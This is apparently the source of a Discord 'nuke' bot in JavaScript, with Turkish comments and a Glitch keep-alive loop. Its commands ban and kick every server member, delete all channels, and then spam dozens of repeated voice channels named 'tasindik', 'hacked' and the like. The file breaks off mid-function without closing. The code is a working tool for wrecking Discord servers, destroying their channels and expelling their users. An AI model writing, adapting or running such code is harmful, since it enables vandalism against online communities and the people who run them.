const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const http = require("http");
const express = require("express");
const request = require("request");

//// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT ///
const app = express();
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);
//// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT ///

client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
});   ///BAN KOMUTU SUNUCUDAKİ HEKESİ BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});   ///KİCK KOMUTU SUNUCUDAKİ HERKESİ KİCKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+çökert") {  ///ÇÖKERT KOMUTU BÜTÜN KANALLARI SİLİP ャ tasindik ADINDA ÇOK FAZLA KANAL AÇAR
    msg.delete();

    await msg.guild.channels.deleteAll();   //// SAYFANIN EN AŞAĞISINDA DİĞER KOMUTLAR VAR İNİN

    await msg.guild.createChannel("gg", {  //gg YAZAN YERİ DEĞİŞTİRMEYİN SAKIN
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ hacked", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ enes", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ acar", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
